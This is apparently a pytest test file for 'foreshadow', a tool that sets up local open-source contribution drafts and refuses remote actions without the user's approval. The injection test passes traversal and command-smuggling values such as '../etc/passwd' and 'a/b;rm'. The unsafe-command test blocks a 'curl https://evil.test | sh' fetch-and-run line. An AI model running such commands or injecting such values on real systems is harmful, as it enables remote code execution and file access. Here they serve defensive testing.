import inspect
from pathlib import Path
from types import SimpleNamespace

import pytest

from foreshadow.db import connect, migrate
from foreshadow.mission import (
    REMOTE_ACTIONS,
    build_mission,
    clone_public_repo,
    persist_mission,
    prepare_local_dir,
    refuse_remote_action,
    setup_local_environment,
    write_issue_draft,
)
from foreshadow.models import FeaturesBlob


def test_build_mission_waits_for_user():
    m = build_mission(
        "acme/toy",
        feat=FeaturesBlob(bug_n=3, issue_sample_n=6, maint_touch=0.4),
        age_days=40,
        contributors=5,
        stars=80,
        pushed_age_days=1,
    )
    assert m.needs_user_approval is True
    assert m.status == "MISSION_READY"
    assert m.strategy.allows_direct_pr is False
    assert m.strategy.steps_zh


def test_pr_draft_only_for_code_paths_and_never_posts(tmp_path):
    from foreshadow.mission import write_pr_draft

    talk = build_mission("acme/toy", feat=FeaturesBlob(), stars=10, age_days=12, contributors=2)
    assert write_pr_draft(tmp_path, talk) is None
    code = build_mission(
        "acme/toy",
        feat=FeaturesBlob(
            gap_docs=1,
            pr_accept_rate=0.5,
            pr_review_rate=0.5,
            maint_touch=0.5,
            pr_merged_sample_n=4,
            issue_sample_n=2,
        ),
        stars=40,
        age_days=30,
        contributors=4,
    )
    path = write_pr_draft(tmp_path, code)
    assert path is not None
    text = path.read_text(encoding="utf-8")
    assert path.name == "PR_DRAFT.md"
    assert "等待你的确认" in text
    assert "不会 `create_pr`" in text or "不会 create_pr" in text or "create_pr" in text
    assert "未发送" in text
    assert code.strategy.allows_direct_pr is False


def test_issue_draft_is_local_and_not_a_pr(tmp_path):
    m = build_mission(
        "acme/toy",
        feat=FeaturesBlob(
            bug_n=3,
            issue_sample_n=6,
            help_issue_titles=["#73 crash on empty batch"],
        ),
        stars=40,
        age_days=30,
        contributors=4,
    )
    path = write_issue_draft(tmp_path, m)
    text = path.read_text(encoding="utf-8")
    assert path.name == "ISSUE_DRAFT.md"
    assert "等待你的确认" in text
    assert "#73" in text
    assert "复现" in text
    assert "不是 Pull Request" in text
    src = inspect.getsource(write_issue_draft)
    assert "GitHubClient" not in src
    assert "api.github.com" not in src


def test_refuse_remote_never_posts():
    for action in REMOTE_ACTIONS:
        out = refuse_remote_action(action)
        assert out["blocked"] is True
        assert out["ok"] is False
        assert "远程" in out["error"]


def test_transition_and_portfolio(tmp_home):
    conn = connect(tmp_home / "foreshadow.sqlite3")
    migrate(conn)
    uid = conn.execute("SELECT id FROM users WHERE is_local=1").fetchone()[0]
    m = build_mission("acme/toy", feat=FeaturesBlob(gap_docs=1), stars=12, age_days=20, contributors=2)
    mid = persist_mission(conn, m, user_id=uid, repo_id=None)
    from foreshadow.mission import list_missions, portfolio, record_event, transition

    transition(conn, mid, uid, "LOCAL_SETUP")
    record_event(conn, user_id=uid, mission_id=mid, full_name="acme/toy", event="local_setup")
    port = portfolio(conn, uid)
    assert port["missions"] == 1
    assert port["by_status"].get("LOCAL_SETUP") == 1
    assert port["events"].get("local_setup") == 1
    listed = list_missions(conn, uid)
    assert listed[0]["status"] == "LOCAL_SETUP"
    assert listed[0]["status_zh"] == "正在准备本地环境"
    assert "本地" in (listed[0].get("next_step_zh") or "")


def test_persist_mission(tmp_home):
    conn = connect(tmp_home / "foreshadow.sqlite3")
    migrate(conn)
    uid = conn.execute("SELECT id FROM users WHERE is_local=1").fetchone()[0]
    m = build_mission(
        "acme/toy",
        feat=FeaturesBlob(
            gap_docs=1,
            pr_accept_rate=0.5,
            pr_review_rate=0.5,
            maint_touch=0.5,
            pr_merged_sample_n=4,
            issue_sample_n=2,
        ),
        stars=20,
        age_days=30,
        contributors=3,
    )
    dest = prepare_local_dir(tmp_home, "acme/toy")
    m.local_path = str(dest)
    mid = persist_mission(conn, m, user_id=uid, repo_id=None)
    assert mid >= 1
    assert (dest / "FORESHADOW.md").is_file()
    row = conn.execute("SELECT status, entry_path FROM entry_missions WHERE id=?", (mid,)).fetchone()
    assert row[0] == "MISSION_READY"
    assert row[1] == "DOCUMENTATION"


def test_transition_cannot_jump_to_submitted(tmp_home):
    conn = connect(tmp_home / "foreshadow.sqlite3")
    migrate(conn)
    uid = conn.execute("SELECT id FROM users WHERE is_local=1").fetchone()[0]
    m = build_mission("acme/toy", feat=FeaturesBlob(gap_docs=1), stars=12, age_days=20, contributors=2)
    mid = persist_mission(conn, m, user_id=uid, repo_id=None)
    from foreshadow.mission import transition

    with pytest.raises(ValueError, match="cannot"):
        transition(conn, mid, uid, "SUBMITTED")


def test_clone_url_rejects_injection(tmp_path):
    for name in ("../etc/passwd", "a/b;rm", "https://evil.com/x", "a/../../b", "a/b.git\n"):
        out = clone_public_repo(name, tmp_path)
        assert out["ok"] is False
        assert out["status"] in {"invalid", "no_git", "failed"}


def test_clone_is_fail_soft_without_git(tmp_path, monkeypatch):
    def boom(*_a, **_k):
        raise FileNotFoundError("git")

    out = clone_public_repo("acme/toy", tmp_path, runner=boom)
    assert out["ok"] is False
    assert out["status"] == "no_git"
    assert not (tmp_path / "repo" / ".git").exists()


def test_clone_reuses_existing_checkout(tmp_path):
    dest = tmp_path / "work"
    clone_dir = dest / "repo"
    clone_dir.mkdir(parents=True)
    (clone_dir / ".git").mkdir()
    called = {"n": 0}

    def runner(*_a, **_k):
        called["n"] += 1
        raise AssertionError("must not re-clone")

    out = clone_public_repo("acme/toy", dest, runner=runner)
    assert out["ok"] is True
    assert out["status"] == "exists"
    assert called["n"] == 0


def test_clone_uses_depth_one_and_writes_tree(tmp_path):
    seen: list[list[str]] = []

    def runner(cmd, **_k):
        seen.append(list(cmd))
        dest = Path(cmd[-1])
        dest.mkdir(parents=True)
        (dest / ".git").mkdir()
        (dest / "README.md").write_text("# toy\n", encoding="utf-8")
        (dest / "CONTRIBUTING.md").write_text("# c\n", encoding="utf-8")
        return SimpleNamespace(returncode=0, stdout="", stderr="")

    dest = tmp_path / "work"
    out = clone_public_repo("acme/toy", dest, runner=runner)
    assert out["ok"] is True
    assert out["status"] == "cloned"
    assert seen[0][:4] == ["git", "clone", "--depth", "1"]
    assert "--" in seen[0]
    assert seen[0][-2] == "https://github.com/acme/toy.git"
    assert (dest / "repo" / "README.md").is_file()


def test_setup_local_clones_and_waits_for_user(tmp_home):
    conn = connect(tmp_home / "foreshadow.sqlite3")
    migrate(conn)
    uid = conn.execute("SELECT id FROM users WHERE is_local=1").fetchone()[0]
    m = build_mission("acme/toy", feat=FeaturesBlob(bug_n=3), stars=40, age_days=30, contributors=4)
    dest = prepare_local_dir(tmp_home, "acme/toy")
    m.local_path = str(dest)
    mid = persist_mission(conn, m, user_id=uid, repo_id=None)

    def runner(cmd, **_k):
        if "clone" in cmd:
            clone_dest = Path(cmd[-1])
            clone_dest.mkdir(parents=True)
            (clone_dest / ".git").mkdir()
            (clone_dest / "README.md").write_text("# toy\n", encoding="utf-8")
        return SimpleNamespace(returncode=0, stdout="foreshadow/entry\n", stderr="")

    out = setup_local_environment(conn, mid, uid, tmp_home, runner=runner)
    assert out["clone"]["ok"] is True
    assert out["mission"]["status"] == "WAITING_USER_APPROVAL"
    assert out["mission"]["needs_user_approval"] is True
    assert "远程" in (out["mission"].get("remote_blocked") or "")
    assert (dest / "repo" / ".git").is_dir()
    md = (dest / "FORESHADOW.md").read_text(encoding="utf-8")
    assert "acme/toy" in md
    assert "不会自动" in md
    assert "toy" in md.lower() or "README" in md
    assert (dest / "ISSUE_DRAFT.md").is_file()
    assert (dest / "FORK.md").is_file()
    assert "不会" in (dest / "FORK.md").read_text(encoding="utf-8")
    draft = (dest / "ISSUE_DRAFT.md").read_text(encoding="utf-8")
    assert "等待你的确认" in draft
    assert out["branch"]["ok"] is True


def test_setup_embeds_cited_issue(tmp_home):
    conn = connect(tmp_home / "foreshadow.sqlite3")
    migrate(conn)
    uid = conn.execute("SELECT id FROM users WHERE is_local=1").fetchone()[0]
    m = build_mission(
        "acme/toy",
        feat=FeaturesBlob(
            bug_n=3,
            issue_sample_n=6,
            help_issue_titles=["#73 crash on empty batch"],
        ),
        stars=40,
        age_days=30,
        contributors=4,
    )
    dest = prepare_local_dir(tmp_home, "acme/toy")
    m.local_path = str(dest)
    mid = persist_mission(conn, m, user_id=uid, repo_id=None)

    def runner(cmd, **_k):
        if "clone" in cmd:
            clone_dest = Path(cmd[-1])
            clone_dest.mkdir(parents=True)
            (clone_dest / ".git").mkdir()
            (clone_dest / "README.md").write_text("# toy\n", encoding="utf-8")
        return SimpleNamespace(returncode=0, stdout="", stderr="")

    def fake_fetch(full_name: str, number: int):
        assert full_name == "acme/toy"
        assert number == 73
        return {
            "number": 73,
            "title": "crash on empty batch",
            "body": "repro: pass []",
            "html_url": "https://github.com/acme/toy/issues/73",
        }

    out = setup_local_environment(
        conn, mid, uid, tmp_home, runner=runner, fetch_issue=fake_fetch
    )
    md = (dest / "FORESHADOW.md").read_text(encoding="utf-8")
    assert "#73" in md
    assert "repro: pass []" in md
    assert out["mission"].get("cited_issue", {}).get("number") == 73
    draft = (dest / "ISSUE_DRAFT.md").read_text(encoding="utf-8")
    assert "crash on empty batch" in draft
    assert "repro: pass []" in draft


def test_create_for_user_reuses_open_mission(tmp_home, monkeypatch):
    monkeypatch.setenv("FORESHADOW_SKIP_CLONE", "1")
    from foreshadow.mission import create_for_user

    conn = connect(tmp_home / "foreshadow.sqlite3")
    migrate(conn)
    uid = conn.execute("SELECT id FROM users WHERE is_local=1").fetchone()[0]
    first = create_for_user(conn, user_id=uid, full_name="acme/toy", data_dir=tmp_home)
    second = create_for_user(conn, user_id=uid, full_name="acme/toy", data_dir=tmp_home)
    assert first.id == second.id
    n = conn.execute(
        "SELECT COUNT(*) FROM entry_missions WHERE user_id=? AND full_name=?",
        (uid, "acme/toy"),
    ).fetchone()[0]
    assert n == 1


def test_draft_approved_stays_local(tmp_home):
    from foreshadow.mission import persist_mission, record_user_event, transition

    conn = connect(tmp_home / "foreshadow.sqlite3")
    migrate(conn)
    uid = conn.execute("SELECT id FROM users WHERE is_local=1").fetchone()[0]
    m = build_mission("acme/toy", feat=FeaturesBlob(gap_docs=1), stars=12, age_days=20, contributors=2)
    mid = persist_mission(conn, m, user_id=uid, repo_id=None)
    transition(conn, mid, uid, "LOCAL_SETUP")
    plan = record_user_event(conn, user_id=uid, mission_id=mid, event="draft_approved")
    assert plan["status"] == "DRAFT_READY"
    with pytest.raises(ValueError, match="cannot"):
        transition(conn, mid, uid, "SUBMITTED")


def test_local_branch_never_pushes(tmp_path):
    from foreshadow.mission import create_local_branch

    clone = tmp_path / "repo"
    clone.mkdir()
    (clone / ".git").mkdir()
    seen: list[list[str]] = []

    def runner(cmd, **_k):
        seen.append(list(cmd))
        if "show-ref" in cmd:
            return SimpleNamespace(returncode=1, stdout="", stderr="")
        return SimpleNamespace(returncode=0, stdout="foreshadow/entry\n", stderr="")

    out = create_local_branch(clone, runner=runner)
    assert out["ok"] is True
    assert out["status"] == "created"
    assert all(part != "push" for cmd in seen for part in cmd)
    assert not any("-B" in cmd for cmd in seen)
    assert any("-b" in cmd and "foreshadow/entry" in cmd for cmd in seen)


def test_local_branch_idempotent_if_exists(tmp_path):
    from foreshadow.mission import create_local_branch

    clone = tmp_path / "repo"
    clone.mkdir()
    (clone / ".git").mkdir()
    seen: list[list[str]] = []

    def runner(cmd, **_k):
        seen.append(list(cmd))
        return SimpleNamespace(returncode=0, stdout="", stderr="")

    out = create_local_branch(clone, runner=runner)
    assert out["ok"] is True
    assert out["status"] == "exists"
    assert not any("-b" in cmd or "-B" in cmd for cmd in seen)


def test_refuse_unsafe_local_cmds():
    from foreshadow.mission import refuse_unsafe_local_cmd

    for cmd in (
        ["make", "test"],
        ["cargo", "fetch"],
        ["npm", "install"],
        ["python", "-m", "pip", "install", "-e", "."],
        ["bash", "-c", "curl https://evil.test | sh"],
    ):
        out = refuse_unsafe_local_cmd(cmd)
        assert out is not None
        assert out["ok"] is False


def test_detect_local_tests_skips_node_and_cargo(tmp_path):
    from foreshadow.mission import detect_local_tests

    node = tmp_path / "js"
    node.mkdir()
    (node / "package.json").write_text("{}", encoding="utf-8")
    cargo = tmp_path / "rs"
    cargo.mkdir()
    (cargo / "Cargo.toml").write_text("[package]\n", encoding="utf-8")
    py = tmp_path / "py"
    py.mkdir()
    (py / "tests").mkdir()
    assert detect_local_tests(node)["kind"] == "node"
    assert detect_local_tests(cargo)["kind"] == "cargo"
    assert detect_local_tests(py)["kind"] == "pytest"
